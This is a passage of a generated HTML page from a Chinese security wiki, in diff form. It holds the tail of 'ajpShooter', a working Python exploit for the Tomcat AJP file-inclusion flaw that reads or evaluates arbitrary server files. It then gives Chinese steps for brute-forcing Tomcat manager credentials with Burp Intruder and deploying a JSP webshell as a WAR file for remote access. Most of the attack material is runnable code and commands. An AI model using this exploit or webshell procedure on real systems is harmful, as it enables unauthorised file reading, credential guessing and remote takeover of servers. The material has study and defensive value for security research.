+        <span class="hljs-keyword">if</span> code_int == <span class="hljs-number">3</span>:
+            self.parse_send_body_chunk()
+        <span class="hljs-keyword">elif</span> code_int == <span class="hljs-number">4</span>:
+            self.parse_headers()
+        <span class="hljs-keyword">elif</span> code_int == <span class="hljs-number">5</span>:
+            self.parse_response_end()
+            quit()
+
+        self.parse_response()
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_headers</span><span class="hljs-params">(self)</span>:</span>
+        log(<span class="hljs-string">&quot;append&quot;</span>, <span class="hljs-string">&apos;\n&apos;</span>)
+        log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;parsing RESPONSE HEADERS&apos;</span>)
+
+        status_int = self.read_int(<span class="hljs-number">2</span>)
+        msg_bytes = self.read_string()
+
+        log(<span class="hljs-string">&apos;&lt;&apos;</span>, status_int, msg_bytes.decode(<span class="hljs-string">&apos;utf8&apos;</span>))
+
+        headers_number_int = self.read_int(<span class="hljs-number">2</span>)
+        log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;headers_nb&apos;</span>, headers_number_int)
+
+        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(headers_number_int):
+            <span class="hljs-comment"># header name: two cases</span>
+            first_byte = self.recv(<span class="hljs-number">1</span>)
+            second_byte = self.recv(<span class="hljs-number">1</span>)
+
+            <span class="hljs-keyword">if</span> first_byte == <span class="hljs-string">b&apos;\xa0&apos;</span>:
+                header_key_bytes = self.common_response_headers[second_byte]
+            <span class="hljs-keyword">else</span>:
+                header_len_bytes = first_byte + second_byte
+                header_len_int = int.from_bytes(header_len_bytes, byteorder=<span class="hljs-string">&apos;big&apos;</span>)
+                header_key_bytes = self.read_bytes(header_len_int)
+                <span class="hljs-comment"># consume the 0x00 terminator</span>
+                self.recv(<span class="hljs-number">1</span>)
+
+            header_value_bytes = self.read_string()
+            <span class="hljs-keyword">try</span>:
+                header_key_bytes = header_key_bytes.decode(<span class="hljs-string">&apos;utf8&apos;</span>)
+                header_value_bytes = header_value_bytes.decode(<span class="hljs-string">&apos;utf8&apos;</span>)
+            <span class="hljs-keyword">except</span>:
+                <span class="hljs-keyword">pass</span>
+            log(<span class="hljs-string">&apos;&lt;&apos;</span>, <span class="hljs-string">&apos;%s: %s&apos;</span> % (header_key_bytes, header_value_bytes))
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_send_body_chunk</span><span class="hljs-params">(self)</span>:</span>
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.body_start:
+            log(<span class="hljs-string">&apos;append&apos;</span>, <span class="hljs-string">&apos;\n&apos;</span>)
+            log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;start parsing body chunk&apos;</span>)
+            self.body_start = <span class="hljs-keyword">True</span>
+        chunk = self.read_string()
+        <span class="hljs-keyword">if</span> self.out_file:
+            self.out.write(chunk)
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">try</span>:
+                chunk = chunk.decode(<span class="hljs-string">&apos;utf8&apos;</span>)
+            <span class="hljs-keyword">except</span>:
+                <span class="hljs-keyword">pass</span>
+
+            log(<span class="hljs-string">&apos;append&apos;</span>, chunk)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_response_end</span><span class="hljs-params">(self)</span>:</span>
+        log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;start parsing end&apos;</span>)
+        code_reuse_int = self.read_int(<span class="hljs-number">1</span>)
+        log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&quot;finish parsing end&quot;</span>, code_reuse_int)
+        self.sock.close()
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_int</span><span class="hljs-params">(self, int_len)</span>:</span>
+        <span class="hljs-keyword">return</span> int.from_bytes(self.recv(int_len), byteorder=<span class="hljs-string">&apos;big&apos;</span>)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_bytes</span><span class="hljs-params">(self, bytes_len)</span>:</span>
+        <span class="hljs-keyword">return</span> self.recv(bytes_len)
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_string</span><span class="hljs-params">(self, int_len=<span class="hljs-number">2</span>)</span>:</span>
+        data_len = self.read_int(int_len)
+        data = self.recv(data_len)
+        <span class="hljs-comment"># consume the 0x00 terminator</span>
+        end = self.recv(<span class="hljs-number">1</span>)
+        log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;read_string read data_len:%d\ndata_len:%d\nend:%s&apos;</span> % (data_len, len(data), end))
+        <span class="hljs-keyword">return</span> data
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv</span><span class="hljs-params">(self, data_len)</span>:</span>
+        data = self.sock.recv(data_len)
+        <span class="hljs-keyword">while</span> len(data) &lt; data_len:
+            log(<span class="hljs-string">&apos;debug&apos;</span>, <span class="hljs-string">&apos;recv not end,wait for %d bytes&apos;</span> % (data_len - len(data)))
+            data += self.sock.recv(data_len - len(data))
+        <span class="hljs-keyword">return</span> data
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ajpShooter</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, args)</span>:</span>
+        self.args = args
+        self.headers = args.header
+        self.ajp_port = args.ajp_port
+        self.requesturl = args.url
+        self.target_file = args.target_file
+        self.shooter = args.shooter
+        self.method = args.X
+        self.out_file = args.out_file
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shoot</span><span class="hljs-params">(self)</span>:</span>
+        headers = self.transform_headers()
+
+        target_file = self.target_file.encode(<span class="hljs-string">&apos;utf8&apos;</span>)
+
+        attributes = []
+        evil_req_attributes = [
+            (<span class="hljs-string">b&apos;javax.servlet.include.request_uri&apos;</span>, <span class="hljs-string">b&apos;index&apos;</span>),
+            (<span class="hljs-string">b&apos;javax.servlet.include.servlet_path&apos;</span>, target_file)
+        ]
+
+        <span class="hljs-keyword">for</span> req_attr <span class="hljs-keyword">in</span> evil_req_attributes:
+            attributes.append((<span class="hljs-string">b&quot;req_attribute&quot;</span>, req_attr))
+
+        <span class="hljs-keyword">if</span> self.shooter == <span class="hljs-string">&apos;read&apos;</span>:
+            self.requesturl += <span class="hljs-string">&apos;/index.txt&apos;</span>
+        <span class="hljs-keyword">else</span>:
+            self.requesturl += <span class="hljs-string">&apos;/index.jsp&apos;</span>
+
+        ajp_ip = urllib.parse.urlparse(self.requesturl).hostname
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ajp_ip, self.ajp_port))
+
+        message = ajpRequest(self.requesturl, self.method, headers, attributes).make_forward_request_package()
+        s.send(message)
+
+        ajpResponse(s, self.out_file).parse_response()
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transform_headers</span><span class="hljs-params">(self)</span>:</span>
+        self.headers = [] <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.headers <span class="hljs-keyword">else</span> self.headers
+        newheaders = []
+        <span class="hljs-keyword">for</span> header <span class="hljs-keyword">in</span> self.headers:
+            hsplit = header.split(<span class="hljs-string">&apos;:&apos;</span>)
+            hname = hsplit[<span class="hljs-number">0</span>]
+            hvalue = <span class="hljs-string">&apos;:&apos;</span>.join(hsplit[<span class="hljs-number">1</span>:])
+            newheaders.append((hname.lower().encode(<span class="hljs-string">&apos;utf8&apos;</span>), hvalue.encode(<span class="hljs-string">&apos;utf8&apos;</span>)))
+
+        <span class="hljs-keyword">return</span> newheaders
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
+    <span class="hljs-comment"># parse command line arguments</span>
+    print(<span class="hljs-string">&apos;&apos;&apos;
+       _    _         __ _                 _            
+      /_\  (_)_ __   / _\ |__   ___   ___ | |_ ___ _ __ 
+     //_\\\\ | | &apos;_ \  \ \| &apos;_ \ / _ \ / _ \| __/ _ \ &apos;__|
+    /  _  \| | |_) | _\ \ | | | (_) | (_) | ||  __/ |   
+    \_/ \_// | .__/  \__/_| |_|\___/ \___/ \__\___|_|   
+         |__/|_|                                        
+                                                00theway,just for test
+    &apos;&apos;&apos;</span>)
+    parser = argparse.ArgumentParser()
+    parser.add_argument(<span class="hljs-string">&apos;url&apos;</span>, help=<span class="hljs-string">&apos;target site\&apos;s context root url like http://www.example.com/demo/&apos;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;ajp_port&apos;</span>, default=<span class="hljs-number">8009</span>, type=int, help=<span class="hljs-string">&apos;ajp port&apos;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;target_file&apos;</span>, help=<span class="hljs-string">&apos;target file to read or eval like /WEB-INF/web.xml,/image/evil.jpg&apos;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;shooter&apos;</span>, choices=[<span class="hljs-string">&apos;read&apos;</span>, <span class="hljs-string">&apos;eval&apos;</span>], help=<span class="hljs-string">&apos;read or eval file&apos;</span>)
+
+    parser.add_argument(<span class="hljs-string">&apos;--ajp-ip&apos;</span>, help=<span class="hljs-string">&apos;ajp server ip,default value will parse from from url&apos;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;-H&apos;</span>, <span class="hljs-string">&apos;--header&apos;</span>, help=<span class="hljs-string">&apos;add a header&apos;</span>, action=<span class="hljs-string">&apos;append&apos;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;-X&apos;</span>, help=<span class="hljs-string">&apos;Sets the method (default: %(default)s).&apos;</span>, default=<span class="hljs-string">&apos;GET&apos;</span>,
+                        choices=[<span class="hljs-string">&apos;GET&apos;</span>, <span class="hljs-string">&apos;POST&apos;</span>, <span class="hljs-string">&apos;HEAD&apos;</span>, <span class="hljs-string">&apos;OPTIONS&apos;</span>, <span class="hljs-string">&apos;PROPFIND&apos;</span>])
+    parser.add_argument(<span class="hljs-string">&apos;-d&apos;</span>, <span class="hljs-string">&apos;--data&apos;</span>, nargs=<span class="hljs-number">1</span>, help=<span class="hljs-string">&apos;The data to POST&apos;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;-o&apos;</span>, <span class="hljs-string">&apos;--out-file&apos;</span>, help=<span class="hljs-string">&apos;write response to file&apos;</span>)
+    parser.add_argument(<span class="hljs-string">&apos;--debug&apos;</span>, action=<span class="hljs-string">&apos;store_true&apos;</span>, default=<span class="hljs-keyword">False</span>)
+
+    args = parser.parse_args()
+    debug = args.debug
+    ajpShooter(args).shoot()
+</code></pre>
+<h2 id="0x07-&#x5229;&#x7528;&#x601D;&#x8DEF;"><a name="0x07-&#x5229;&#x7528;&#x601D;&#x8DEF;" class="anchor-navigation-ex-anchor" href="#0x07-&#x5229;&#x7528;&#x601D;&#x8DEF;"><i class="fa fa-link" aria-hidden="true"></i></a>0x07 &#x5229;&#x7528;&#x601D;&#x8DEF;</h2>
+<p>&#x9996;&#x5148;&#x63A2;&#x6D4B;&#x76EE;&#x6807;&#x7BA1;&#x7406;&#x9875;&#x9762;&#xFF0C;&#x4E0D;&#x540C;&#x7248;&#x672C;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x4E8E;&#x4E0D;&#x540C;&#x76EE;&#x5F55;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;ffuf&#x7B49;&#x5DE5;&#x5177;</p>
+<p>&#x968F;&#x540E;&#x4F7F;&#x7528;burp&#x6293;&#x53D6;&#x8BA4;&#x8BC1;&#x5305;&#xFF0C;&#x4ED6;&#x770B;&#x8D77;&#x6765;&#x50CF;&#x8FD9;&#x6837;</p>
+<pre><code class="lang-raw">GET /manager/html HTTP/1.1
+Host: xxxxx
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Authorization: Basic &#xA7;YWRtaW46MTIzNDU2&#xA7; //&#x8FD9;&#x91CC;&#x662F;&#x8BA4;&#x8BC1;&#x5B57;&#x6BB5;&#xFF0C;&#x4E00;&#x822C;&#x53EA;&#x662F;base64&#x7F16;&#x7801;
+</code></pre>
+<p>&#x53D1;&#x9001;&#x5230; <code>Intruder</code> &#x9009;&#x62E9; Attack Type <code>Sniper</code> &#xFF0C;&#x5E76;&#x5BF9;Authorization: Basic &#x540E;&#x7684;&#x5185;&#x5BB9;&#x8BBE;&#x7F6E; <code>&#xA7;</code> &#x6807;&#x8BC6;&#x3002; &#x5728;Payloads &#x9009;&#x9879;&#x5361;&#x4E2D;&#x7684; Payload Type &#x6807;&#x7B7E;&#x4E2D;&#x5C06;&#x5176;&#x8BBE;&#x7F6E;&#x4E3A; <code>Custom iterator</code> &#xFF1B;</p>
+<p><strong>&#x5982;&#x679C;&#x76EE;&#x6807;&#x6570;&#x636E;&#x5305;&#x4E2D;&#x6709;Cookie&#x5B57;&#x6BB5;&#xFF0C;&#x9700;&#x8981;&#x5220;&#x9664;&#x6216;&#x8005;&#x968F;&#x673A;fuzz&#xFF0C;&#x5426;&#x5219;401</strong></p>
+<p>&#x5728; Payload Options &#x5B50;&#x6807;&#x7B7E;&#x4E2D;&#xFF0C;&#x7684;Position&#x5904;&#xFF0C;&#x9009;&#x62E9; 1&#x3001;2&#x3001;3 Payload&#x5185;&#x5BB9;&#x5361;&#xFF0C;&#x5206;&#x522B;&#x5728;1&#x4E2D;&#x586B;&#x5199;&#x7528;&#x6237;&#x540D; , 2&#x4E2D;&#x586B;&#x5199; <code>:</code>&#x7B26;&#x53F7; , 3&#x4E2D;&#x586B;&#x5199;&#x5BC6;&#x7801;</p>
+<p>&#x5728;Payload Processing &#x5B50;&#x6807;&#x7B7E;&#x4E2D;&#xFF0C;&#x70B9;&#x51FB; <code>add</code> &#x9009;&#x62E9; <code>Encode</code> &#x548C; <code>Base64-encode</code> &#xFF0C;&#x6700;&#x540E;&#x5C06;Payload Encoding &#x5B50;&#x6807;&#x7B7E;&#x7684;&#x5185;&#x5BB9;&#x53D6;&#x6D88;&#x52FE;&#x9009;&#xFF0C;&#x968F;&#x540E;&#x5F00;&#x59CB;&#x7206;&#x7834;</p>
+<p>&#x5229;&#x7528;&#x547D;&#x4EE4;&#x628A; jsp webshell &#x8F6C;&#x6362;&#x4E3A;war&#x5305;</p>
+<pre><code>jar -cvf &lt;war filename&gt; &quot;shell.jsp&quot;
+</code></pre><p><strong>&#x5B9E;&#x6218;&#x4E2D;&#x76F4;&#x63A5;zip&#x6253;&#x5305;&#x6539;&#x540D;&#x4E5F;&#x53EF;&#x4EE5;</strong></p>
+<p>&#x5728;&#x767B;&#x5165;&#x540E;&#x53F0;&#x540E;&#xFF0C;&#x70B9;&#x51FB; List Applications &#x5728; WAR file to deploy &#x9009;&#x9879;&#x5361;&#x4E2D;&#x9009;&#x62E9;war &#x6587;&#x4EF6;&#x4E0A;&#x4F20;</p>
+<p>&#x5229;&#x7528;webshell &#x7BA1;&#x7406;&#x5DE5;&#x5177;&#x8FDE;&#x63A5;&#xFF0C;&#x8BBF;&#x95EE;&#x8DEF;&#x5F84;&#x662F; <code>/war&#x5305;&#x540D;(&#x4E0D;&#x5E26;.war)/XXX.jsp</code></p>
+<p>&#x56FE;&#x6587;&#x94FE;&#x63A5;:</p>
+<p>https[:]//github.com/fofapro/vulfocus/blob/master/writeup/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4.md</p>
+<h2 id="0x08-&#x6269;&#x5C55;&#x94FE;&#x63A5;"><a name="0x08-&#x6269;&#x5C55;&#x94FE;&#x63A5;" class="anchor-navigation-ex-anchor" href="#0x08-&#x6269;&#x5C55;&#x94FE;&#x63A5;"><i class="fa fa-link" aria-hidden="true"></i></a>0x08 &#x6269;&#x5C55;&#x94FE;&#x63A5;</h2>
+<p><a href="https://github.com/fofapro/vulfocus/blob/master/writeup/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4/Tomcat%E5%BC%B1%E5%8F%A3%E4%BB%A4.md" target="_blank">Tomcat &#x5F31;&#x53E3;&#x4EE4; Getshell by Frivolous-scholar</a> </p>
+<h2 id="0x9-&#x8054;&#x7CFB;&#x65B9;&#x5F0F;"><a name="0x9-&#x8054;&#x7CFB;&#x65B9;&#x5F0F;" class="anchor-navigation-ex-anchor" href="#0x9-&#x8054;&#x7CFB;&#x65B9;&#x5F0F;"><i class="fa fa-link" aria-hidden="true"></i></a>0x9 &#x8054;&#x7CFB;&#x65B9;&#x5F0F;</h2>
+<p>&#x4F5C;&#x8005; : BitWiki&#x652F;&#x6301;&#x56E2;&#x961F;</p>
+
+<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="CVE-2020-1938 Tomcat  存在AJP 文件包含漏洞.html" class="navigation navigation-prev " aria-label="Previous page: CVE 2020 1938 Tomcat  存在AJP 文件包含漏洞">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="../../SonarQube/" class="navigation navigation-next " aria-label="Next page: SonarQube">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Tomcat 管理后台弱口令导致的文件上传GetShell","level":"2.1.2.3","depth":3,"next":{"title":"SonarQube","level":"2.2","depth":1,"path":"漏洞文库/SonarQube/README.md","ref":"漏洞文库/SonarQube/README.md","articles":[{"title":"CVE 2020 27986 SonarQube 小于 8.4.2.X 存在API未授权访问漏洞","level":"2.2.1","depth":2,"path":"漏洞文库/SonarQube/CVE-2020-27986 SonarQube 小于 8.4.2.x 存在API未授权访问漏洞.md","ref":"漏洞文库/SonarQube/CVE-2020-27986 SonarQube 小于 8.4.2.x 存在API未授权访问漏洞.md","articles":[]}]},"previous":{"title":"CVE 2020 1938 Tomcat  存在AJP 文件包含漏洞","level":"2.1.2.2","depth":3,"path":"漏洞文库/Apache/TomCat/CVE-2020-1938 Tomcat  存在AJP 文件包含漏洞.md","ref":"漏洞文库/Apache/TomCat/CVE-2020-1938 Tomcat  存在AJP 文件包含漏洞.md","articles":[]},"dir":"ltr"},"config":{"plugins":["codeblock-filename","summary","chapter-fold","copy-code-button","-sharing","-lunr","search-pro","splitter","github-buttons","insert-logo","custom-favicon","popup","back-to-top-button","advanced-emoji","theme-comscore","rss","hide-element","anchor-navigation-ex","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"chapter-fold":{},"livereload":{},"summary":{},"splitter":{},"search-pro":{},"search":{},"popup":{},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"rss":{"categories":["gitbook"],"title":"BitWiki","description":"A permanently free and open source knowledge base for cyber security | 一个永久免费 、开源的网络安全知识库","author":"BitWiki支持团队","feed_url":"https://wiki.1bit.win/doc/rss","site_url":"https://wiki.1bit.win/","managingEditor":"team@onebit.tk","webMaster":"team@onebit.tk"},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"../images/favicon.ico","codeblock-filename":{},"theme-comscore":{},"back-to-top-button":{},"github-buttons":{"repo":"Bitwiki/bitwiki.github.io","types":["star","watch","fork"],"size":"small"},"custom-favicon":{},"copy-code-button":{},"advanced-emoji":{"embedEmojis":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"insert-logo":{"style":"background: none; max-height: 60px; min-height: 60px","url":"../images/BitWiki.png"}},"theme":"default","author":"BitWiki支持团队","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"language":"zh-hans","links":{"sidebar":{"OneBit安全团队":"https://onebitsec.github.io/","GitHub":"https://github.com/BitWiki/bitwiki.github.io"}},"gitbook":"*","description":"A permanently free and open source knowledge base for cyber security | 一个永久免费 、开源的网络安全知识库"},"file":{"path":"漏洞文库/Apache/TomCat/Tomcat 管理后台弱口令导致的文件上传GetShell.md","mtime":"2022-03-13T18:27:41.131Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-03-18T11:31:49.665Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-insert-logo/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-rss/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
